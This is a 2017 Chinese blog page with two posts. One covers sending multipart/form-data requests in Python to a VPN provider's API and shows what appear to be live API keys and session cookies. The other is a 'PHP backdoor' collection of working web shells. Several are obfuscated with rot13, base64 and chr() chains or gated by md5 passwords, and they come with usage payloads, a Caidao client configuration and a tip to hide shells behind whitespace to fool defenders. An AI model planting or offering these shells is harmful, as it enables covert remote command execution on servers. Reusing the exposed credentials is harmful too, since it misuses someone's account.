              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-01T16:39:10+08:00">
                2017-09-01
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>python中能够发请求的包有很多种，有urllib、urllib2、urllib3、requests等，而且仅这几个python库，就能衍生出上百种请求方法，一一赘述明显不合适，这里仅仅讲述基础方法以及我所遇到的问题。</p>
<h4 id="发送multipart-form-data-数据"><a href="#发送multipart-form-data-数据" class="headerlink" title="发送multipart/form-data; 数据"></a>发送<code>multipart/form-data;</code> 数据</h4><p>有许多种情形下需要发送multipart/form-data数据，如文件上传、网络验证等</p>
<h5 id="方法一：用urllib2请求"><a href="#方法一：用urllib2请求" class="headerlink" title="方法一：用urllib2请求"></a>方法一：用urllib2请求</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> urllib</div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"></div><div class="line">header=&#123;</div><div class="line">    <span class="string">"Host"</span>: <span class="string">"api.surfeasy.com"</span>,</div><div class="line">    <span class="string">"Connection"</span>: <span class="string">"keep-alive"</span>,</div><div class="line">    <span class="string">"SE-Client-Locale"</span>: <span class="string">"zh-CN"</span>,</div><div class="line">    <span class="string">"Origin"</span>: <span class="string">"chrome-extension://odiddbcijempnhhobijfbggjogofdlgl"</span>,</div><div class="line">    <span class="string">"SE-Client-Type"</span>: <span class="string">"se0210"</span>,</div><div class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"</span>,</div><div class="line">    <span class="string">"SE-Client-Name"</span>: <span class="string">"odiddbcijempnhhobijfbggjogofdlgl"</span>,</div><div class="line">    <span class="string">"SE-Operating-System"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"</span>,</div><div class="line">    <span class="string">"SE-Client-API-Key"</span>: <span class="string">"DCF8EF2E5C791C25797F4F862EEF60DA7510BB4847058A8CE6357EFB4E692C79"</span>,</div><div class="line">    <span class="string">"SE-Client-Version"</span>: <span class="string">"1.3.6"</span>,</div><div class="line">    <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate, br"</span>,</div><div class="line">    <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8"</span>,</div><div class="line">    <span class="string">"Cookie"</span>: <span class="string">"api_session=BAhJIgGvZXlKcFpDSTZNVGt3TXpZNE1qVXNJbTltSWpvM056YzJNREF3TENKMGF5STZJbU01TW1ObU1UbGtOakppCk1qSXdNekZqWXpjd04yVmlNMlZtTUdWak9Ua3dOR1UwTVRGbFpUWXdNamxoWWpNNFl6QmpNbUptTURKaApNelZtWldWa04yRWlMQ0owYlNJNklqSXdNVGN0TVRFdE16QlVNRFU2TXpnNk1EaGFJbjA9CgY6BkVG--8d2bd7b8fab0d29ff09569e326d806e3d8b5ab22; api_session=BAhJIgGvZXlKcFpDSTZNVGt3TXpZNE1qVXNJbTltSWpvM056YzJNREF3TENKMGF5STZJakZtWlRZMVltRTJZV016Ck1HVXhNMlZtTkRSalpEWTJOMll5WkRJd1l6VmxObVkzTVRoaU4yRXhOakE1WVRWbVkyWTNNMk0wWm1ZMApPVFJqTXpRM1lqVWlMQ0owYlNJNklqSXdNVGN0TVRFdE16QlVNRGM2TURnNk5UUmFJbjA9CgY6BkVG--48a4f3899a63984d4061a64ae9864c8f9ecf2ad6"</span></div><div class="line">    &#125;</div><div class="line">data = <span class="string">'''--123456\r</span></div><div class="line">Content-Disposition: form-data; name="device_id"\r</div><div class="line">\r</div><div class="line">ab197fb4782f20bd5808133bdd8121ecd422ffb6\r</div><div class="line">--123456--\r</div><div class="line">'''</div><div class="line"><span class="comment">#print requests.post("https://api.surfeasy.com/v3/geo_lookup", verify=False, headers=header, data=data).text</span></div><div class="line">req = urllib2.Request(url=<span class="string">"https://api.surfeasy.com/v2/geo_list"</span>, headers=header)</div><div class="line">req.add_header(<span class="string">'Content-type'</span>, <span class="string">"multipart/form-data; boundary=123456"</span>)</div><div class="line">req.add_header(<span class="string">'Content-length'</span>, len(data))</div><div class="line">req.add_data(data)</div><div class="line"></div><div class="line"><span class="keyword">print</span> urllib2.urlopen(req).read() <span class="comment">#读取指定网站的内容</span></div></pre></td></tr></table></figure>
<font color="#f00">你会发现，我们竟然用post的方法进行了相应的请求！但是这里面有几处十分坑爹的地方</font>

<ol>
<li>boundary所包含的字符串一定是data中分界的字符串，并且一般以--boundary开头，以--boundary--结尾</li>
<li>注意data数据换行用\r\n或者\x0d\x0a来分割，最后结尾处也有\r\n</li>
<li>header头中的Content-type一定得有，但是Content-length却不是必须的</li>
<li>一般Content-Disposition: form-data;数据会先空一行，然后才是数据</li>
</ol>
<p>本内容参考的是:<a href="https://gist.github.com/zhenyi2697/5252801" target="_blank" rel="external">https://gist.github.com/zhenyi2697/5252801</a></p>
<h5 id="方法二：用requests请求"><a href="#方法二：用requests请求" class="headerlink" title="方法二：用requests请求"></a>方法二：用requests请求</h5><p>可能大家会说，requests多简单啊，其实确实是这样的，毕竟requests是专门为黑客开发的一套工具</p>
<blockquote>
<p> 当然，我们仍然可以利用上述的方法进行请求，我尝试过，仍然可以得到需要的结果！</p>
</blockquote>
<p>现在讲讲另外一种方法</p>
<p>在官方网站上，requests模拟一个表单数据的格式如下：</p>
<blockquote>
<p>files = {&#39;name&#39;: (<filename>, <file object="">,<content type="">, <per-part headers="">)}</per-part></content></file></filename></p>
<p>如果有多条内容，就在字典中加入多个内容。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">files = &#123;</div><div class="line">  &apos;device_id&apos;:(None,None,&quot;ab197fb4782f20bd5808133bdd8121ecd422ffb6&quot;)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>然后发送请求</p>
<blockquote>
<p> response=requests.post(url,files=files)</p>
</blockquote>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/28/php后门/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/08/28/php后门/" itemprop="url">php后门</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-28T20:39:59+08:00">
                2017-08-28
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="获取输入数据的手段"><a href="#获取输入数据的手段" class="headerlink" title="获取输入数据的手段"></a>获取输入数据的手段</h3><p>$\_GET[&quot;password&quot;]</p>
<p>$\_POST[&quot;password&quot;]</p>
<p>$\_REQUEST[&quot;password&quot;]</p>
<p>$\_COOKIE[&quot;password&quot;]</p>
<p>$\_GET[&quot;password&quot;]</p>
<p>$\_SERVER[&#39;HTTP_USER_AGENT&#39;]</p>
<p>$\_SERVER[&#39;HTTP_HOST&#39;]</p>
<p>$_SERVER[&#39;HTTP_REFERER&#39;]</p>
<p>$_SERVER[&#39;HTTP_ACCEPT_LANGUAGE&#39;]    // Accept-Language: </p>
<p>$_SERVER[&#39;HTTP_ACCEPT_CHARSET&#39;]    // Accept-Charset:</p>
<p>$_SERVER[&#39;QUERY_STRING&#39;]    /?abcdef</p>
<p>$_SERVER[&#39;HTTP_X\_FORWARDED\_FOR&#39;]</p>
<p>$_SERVER[&#39;HTTP_CONNECTION&#39;]    // Connection: </p>
<p>$_SERVER[&#39;HTTP_ACCEPT_ENCODING&#39;]  // Accept-Encoding: </p>
<p>$_SERVER[&#39;HTTP_ACCEPT&#39;]        // Accept: </p>
<p>$_SERVER[&#39;HTTP_VIA&#39;]        // Via: </p>
<p>$_SERVER[&#39;HTTP_CLIENT_IP&#39;]    // Client-IP:</p>
<p>$_SERVER[&#39;HTTP_UPGRADE_INSECURE_REQUESTS&#39;]    // Upgrade-Insecure-Requests:</p>
<p>$_SERVER[&quot;HTTP_CACHE_CONTROL&quot;]    // Cache-Control:</p>
<p>$_SERVER[&quot;HTTP_KEEP_ALIVE&quot;]            // Keep-Alive: </p>
<p>$\_SERVER[&quot;HTTP_AB_CD&quot;]        // Ab-Cd: </p>
<blockquote>
<p>其实从后面的$\<em>SERVER[&quot;HTTP\</em>&quot;]的一些展示可以看出，对于头文件中的任意字段，只需要将-转换为\<em>，并且将所有字母转化为大写，那么就可以在php后端中进行处理！所以以HTTP</em>开头的内容，其实是自定义内容！</p>
</blockquote>
<h3 id="php命令执行函数"><a href="#php命令执行函数" class="headerlink" title="php命令执行函数"></a>php命令执行函数</h3><p>php提供4种方法执行系统外部命令：exec()、passthru()、system()、 shell_exec()。<br>在开始介绍前，先检查下php配置文件php.ini中是有禁止这是个函数。找到 disable_functions，配置如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">disable_functions =</div></pre></td></tr></table></figure>
<p>如果“disable_functions=”后面有接上面四个函数，将其删除。<br>默认php.ini配置文件中是不禁止你调用执行外部命令的函数的。</p>
<h4 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h4><p>string <strong>exec</strong> ( string <code>$command</code> [, array <code>&amp;$output</code> [, int <code>&amp;$return_var</code> ]] )</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">        <span class="keyword">echo</span> exec(<span class="string">"ls"</span>,$file);</div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</div><div class="line">        print_r($file);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>执行结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">test.php</div><div class="line">Array( [0] =&gt; index.php [1] =&gt; test.php)</div></pre></td></tr></table></figure>
<p>知识点：<br>exec 执行系统外部命令时不会输出结果，而是返回结果的最后一行，如果你想得到结果你可以使用第二个参数，让其输出到指定的数组，此数组一个记录代表输出的一行，即如果输出结果有20行，则这个数组就有20条记录，所以如果你需要反复输出调用不同系统外部命令的结果，你最好在输出每一条系统外部命令结果时清空这个数组，以防混乱。第三个参数用来取得命令执行的状态码，通常执行成功都是返回0。</p>
<h4 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h4><p>void <strong>passthru</strong> ( string <code>$command</code> [, int <code>&amp;$return_var</code> ] )</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">        passthru(<span class="string">"ls"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>执行结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.phptest.php</div></pre></td></tr></table></figure>
<p>知识点：<br>passthru与exec的区别，passthru直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，不返回任何值，且其可以输出二进制，比如图像数据。</p>
<h4 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h4><p>string <strong>system</strong> ( string <code>$command</code> [, int <code>&amp;$return_var</code> ] )</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">        system(&quot;ls /&quot;);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>执行结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">binbootcgroupdevetchomeliblost+foundmediamntoptprocrootsbinselinuxsrvsystmpusrvar</div></pre></td></tr></table></figure>
<p>知识点：<br>system和exec的区别在于system在执行系统外部命令时，直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，如果执行命令成功则返回true，否则返回false。第二个参数与exec第三个参数含义一样。</p>
<h4 id="反撇号-和shell-exec"><a href="#反撇号-和shell-exec" class="headerlink" title="反撇号`和shell_exec()"></a>反撇号`和shell_exec()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">        <span class="keyword">echo</span> `pwd`;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>执行结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/var/www/html</div></pre></td></tr></table></figure>
<p>知识点：</p>
<p>shell_exec() 函数实际上仅是反撇号 (`) 操作符的变体</p>
<h4 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h4><p>resource <strong>popen</strong> ( string <code>$command</code> , string <code>$mode</code> )</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$handle = popen(<span class="string">"dir"</span>, <span class="string">"r"</span>);</div><div class="line">$read = fread($handle, <span class="number">4096</span>);</div><div class="line"><span class="keyword">echo</span> $read;</div><div class="line">pclose($handle);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>执行结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"> E:\wamp\www\</div><div class="line"></div><div class="line">2017/08/28  19:27    &lt;DIR&gt;          .</div><div class="line">2017/08/28  19:27    &lt;DIR&gt;          ..</div><div class="line">2017/08/20  11:43               656 404.php</div><div class="line">2017/05/07  13:51               145 302.php</div></pre></td></tr></table></figure>
<p>知识点：</p>
<p>popen也可以执行命令，知识执行命令时不是很方便</p>
<h4 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a>pcntl_exec()</h4><p>void <strong>pcntl_exec</strong> ( string <code>$path</code> [, array <code>$args</code> [, array <code>$envs</code> ]] )</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">#exec.php</div><div class="line">&lt;?php pcntl_exec(“/bin/bash”, array(“/tmp/b4dboy.sh”));?&gt;</div><div class="line"></div><div class="line">#/tmp/b4dboy.sh</div><div class="line">#!/bin/bash</div><div class="line">ls -l /</div></pre></td></tr></table></figure>
<h3 id="php后门"><a href="#php后门" class="headerlink" title="php后门"></a>php后门</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="number">1</span>]);<span class="meta">?&gt;</span></div><div class="line">post: <span class="number">1</span>=system(<span class="string">"ls"</span>);</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(str_rot13(<span class="string">'riny($_CBFG[cntr]);'</span>));<span class="meta">?&gt;</span></div><div class="line">post: page=system(<span class="string">"ls"</span>);</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> call_user_func(create_function(<span class="keyword">null</span>,<span class="string">'assert($_POST[c]);'</span>));<span class="meta">?&gt;</span></div><div class="line">post: c=system(<span class="string">"ls"</span>);</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> $x=base64_decode(<span class="string">"YXNzZXJ0"</span>);$x($_POST[<span class="string">'c'</span>]);<span class="meta">?&gt;</span></div><div class="line">中间base64解密为assert</div><div class="line">post: c=system(<span class="string">"ls"</span>);</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> array_map(<span class="string">"ass\x65rt"</span>,(<span class="keyword">array</span>)$_REQUEST[<span class="string">'expdoor'</span>]);<span class="meta">?&gt;</span></div><div class="line">get/post: expdoor=system(<span class="string">"ls"</span>);</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> @preg_replace(<span class="string">"/f/e"</span>,$_GET[<span class="string">'u'</span>],<span class="string">"fengjiao"</span>); <span class="meta">?&gt;</span></div><div class="line"></div><div class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = <span class="number">-1</span> [, int &amp;$count ]] )</div><div class="line">◆i ：如果在修饰符中加上<span class="string">"i"</span>，则正则将会取消大小写敏感性，即<span class="string">"a"</span>和<span class="string">"A"</span> 是一样的。</div><div class="line">◆m：默认的正则开始<span class="string">"^"</span>和结束<span class="string">"$"</span>只是对于正则字符串如果在修饰符中加上<span class="string">"m"</span>，那么开始和结束将会指字符串的每一行：每一行的开头就是<span class="string">"^"</span>，结尾就是<span class="string">"$"</span>。</div><div class="line">◆s：如果在修饰符中加入<span class="string">"s"</span>，那么默认的<span class="string">"."</span>代表除了换行符以外的任何字符将会变成任意字符，也就是包括换行符！</div><div class="line">◆x：如果加上该修饰符，表达式中的空白字符将会被忽略，除非它已经被转义。</div><div class="line">◆e：本修饰符仅仅对于replacement有用，代表在replacement中作为PHP代码。</div><div class="line">◆A：如果使用这个修饰符，那么表达式必须是匹配的字符串中的开头部分。比如说<span class="string">"/a/A"</span>匹配<span class="string">"abcd"</span>。</div><div class="line">◆E：与<span class="string">"m"</span>相反，如果使用这个修饰符，那么<span class="string">"$"</span>将匹配绝对字符串的结尾，而不是换行符前面，默认就打开了这个模式。</div><div class="line">◆U：和问号的作用差不多，用于设置<span class="string">"贪婪模式"</span>。</div><div class="line"></div><div class="line">http:<span class="comment">//localhost/test2.php?u=eval($_POST[c]);</span></div><div class="line">post: c=system(<span class="string">"ls"</span>);</div><div class="line"></div><div class="line">菜刀中：</div><div class="line">密码：c</div><div class="line">配置：&lt;O&gt;u=<span class="keyword">eval</span>($_POST[c]);&lt;/O&gt;</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(base64_decode(ZXZhbChiYXNlNjRfZGVjb2RlKFpYWmhiQ2hpWVhObE5qUmZaR1ZqYjJSbEtFeDVPRGhRTTBKdlkwRndiR1J0Um5OTFExSm1WVVU1VkZaR2RHdGlNamw1V0ZOclMweDVPQzVqYUhJb05EY3BMbEJuS1NrNykpOw));<span class="meta">?&gt;</span></div><div class="line"></div><div class="line">其实其将</div><div class="line"><span class="comment">//<span class="meta">&lt;?php</span></span></div><div class="line"><span class="keyword">eval</span>($_POST[door])</div><div class="line"><span class="comment">//<span class="meta">?&gt;</span></span></div><div class="line">多次base64加密解密，并且在一定程度上进行了混淆(插入了chr(<span class="number">47</span>))</div><div class="line"></div><div class="line">post: door=system(<span class="string">"ls"</span>);</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> @<span class="keyword">include</span>($_FILES[<span class="string">'u'</span>][<span class="string">'tmp_name'</span>]);  <span class="meta">?&gt;</span></div><div class="line"></div><div class="line">上传一个木马文件，最好的方式是上传一个大马，这样对方就很难进行测试</div><div class="line"></div><div class="line">请求：</div><div class="line">/index.php?c=system(<span class="string">'ls'</span>);</div><div class="line">Content-Type: multipart/form-data; boundary=--------------------------<span class="number">-262952846810849</span></div><div class="line">  </div><div class="line">----------------------------<span class="number">-262952846810849</span></div><div class="line">Content-Disposition: form-data; name=<span class="string">"u"</span>; filename=<span class="string">"easy.php"</span></div><div class="line">Content-Type: application/octet-stream</div><div class="line"></div><div class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_GET[c]); <span class="meta">?&gt;</span></div><div class="line">----------------------------<span class="number">-262952846810849</span>--</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>($_GET[<span class="string">"hackers"</span>]==<span class="string">"2b"</span>)&#123;<span class="keyword">if</span> ($_SERVER[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">'POST'</span>) &#123; <span class="keyword">echo</span> <span class="string">"url:"</span>.$_FILES[<span class="string">"upfile"</span>][<span class="string">"name"</span>];<span class="keyword">if</span>(!file_exists($_FILES[<span class="string">"upfile"</span>][<span class="string">"name"</span>]))&#123; copy($_FILES[<span class="string">"upfile"</span>][<span class="string">"tmp_name"</span>], $_FILES[<span class="string">"upfile"</span>][<span class="string">"name"</span>]); &#125;&#125;<span class="meta">?&gt;</span>&lt;form method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;&lt;input name=<span class="string">"upfile"</span> type=<span class="string">"file"</span>&gt;&lt;input type=<span class="string">"submit"</span> value=<span class="string">"ok"</span>&gt;&lt;/form&gt;<span class="meta">&lt;?php</span> &#125;<span class="meta">?&gt;</span></div><div class="line"></div><div class="line">用法：</div><div class="line">上传木马文件，最好还是上传大马！</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> $s=@$_GET[<span class="number">2</span>];<span class="keyword">if</span>(md5($s.$s)==<span class="string">"c70d1cfca94435256f2874706af4c3c8"</span>)@<span class="keyword">eval</span>($_REQUEST[$s]); <span class="meta">?&gt;</span></div><div class="line"></div><div class="line">用法：</div><div class="line">get: ?<span class="number">2</span>=moushen</div><div class="line">post/get: moushen=system(<span class="string">"ls"</span>);</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> $_uU=chr(<span class="number">99</span>).chr(<span class="number">104</span>).chr(<span class="number">114</span>);$_cC=$_uU(<span class="number">101</span>).$_uU(<span class="number">118</span>).$_uU(<span class="number">97</span>).$_uU(<span class="number">108</span>).$_uU(<span class="number">40</span>).$_uU(<span class="number">36</span>).$_uU(<span class="number">95</span>).$_uU(<span class="number">80</span>).$_uU(<span class="number">79</span>).$_uU(<span class="number">83</span>).$_uU(<span class="number">84</span>).$_uU(<span class="number">91</span>).$_uU(<span class="number">49</span>).$_uU(<span class="number">93</span>).$_uU(<span class="number">41</span>).$_uU(<span class="number">59</span>);$_fF=$_uU(<span class="number">99</span>).$_uU(<span class="number">114</span>).$_uU(<span class="number">101</span>).$_uU(<span class="number">97</span>).$_uU(<span class="number">116</span>).$_uU(<span class="number">101</span>).$_uU(<span class="number">95</span>).$_uU(<span class="number">102</span>).$_uU(<span class="number">117</span>).$_uU(<span class="number">110</span>).$_uU(<span class="number">99</span>).$_uU(<span class="number">116</span>).$_uU(<span class="number">105</span>).$_uU(<span class="number">111</span>).$_uU(<span class="number">110</span>);$_=$_fF(<span class="string">""</span>,$_cC);@$_();<span class="meta">?&gt;</span></div><div class="line"></div><div class="line">等价于：</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$_uU=<span class="string">"chr"</span>;</div><div class="line">$_cC=<span class="string">"eval($_POST[1]);"</span>;</div><div class="line">$_fF=<span class="string">"create_function"</span>;</div><div class="line">$_=create_function(<span class="string">""</span>,<span class="string">"eval($_POST[1]);"</span>);</div><div class="line">$_();	<span class="comment">// 将上面的语句进行执行</span></div><div class="line"></div><div class="line">string create_function ( string $args , string $code )</div><div class="line">$args是参数(<span class="string">"$a,$b,$c"</span>)，$code是执行代码，返回的是函数名</div><div class="line">要调用时，直接在函数名后面加上()即可。但是需要注意的是，一定不能直接加在create_function之后，需要将其返回给一个变量，然后调用！</div><div class="line"></div><div class="line">使用：</div><div class="line">post: <span class="number">1</span>=system(<span class="string">"ls"</span>);</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">md5($_GET[<span class="string">'qid'</span>])==<span class="string">'ba710ce1a217e63bf9f5ac483d2e9a6f'</span>?array_map(<span class="string">"as\x73ert"</span>,(<span class="keyword">array</span>)$_REQUEST[<span class="string">'page'</span>]):next;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line"><span class="keyword">array</span> array_map ( callable $callback , <span class="keyword">array</span> $array1 [, <span class="keyword">array</span> $... ] )</div><div class="line">array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。</div><div class="line"> </div><div class="line">使用：</div><div class="line">?qid=moushenhao</div><div class="line">post/get: page</div></pre></td></tr></table></figure>
<font color="#f00">为了迷惑敌人，可以在shell中加入大量空格、换行！！</font>

